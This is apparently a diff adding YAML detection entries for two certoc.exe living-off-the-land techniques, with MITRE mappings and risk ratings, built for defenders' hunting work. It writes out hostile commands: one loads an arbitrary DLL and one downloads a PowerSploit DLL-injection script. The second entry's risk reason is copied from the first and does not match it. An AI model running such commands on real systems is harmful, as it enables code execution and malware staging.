@@ -1,0 +1,40 @@
+- command: certoc.exe -LoadDLL "C:\test\calc.dll"
+  description: Load and execute code from an arbitrary DLL using certoc utility on Microsoft Servers.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Execution:
+      - T1218
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/
+  risk: High
+  risk_reason: Loading DLLs with certoc is highly suspicious and should be very predictable in nature if part of normal IT operations.
+  fidelity: High
+  fidelity_reason: This is likely a very rare type of commandline in most organizations.
+  tool: certoc
+  threatactors:
+    N/A:
+      - N/A
+- command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
+  description: Downloads a text-formatted file from the given remote location - in this case, a component of PowerSploit.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/
+  risk: High
+  risk_reason: Loading DLLs with certoc is highly suspicious and should be very predictable in nature if part of normal IT operations.
+  fidelity: High
+  fidelity_reason: This is likely a very rare type of commandline in most organizations.
+  tool: certoc
+  threatactors:
+    N/A:
+      - N/A
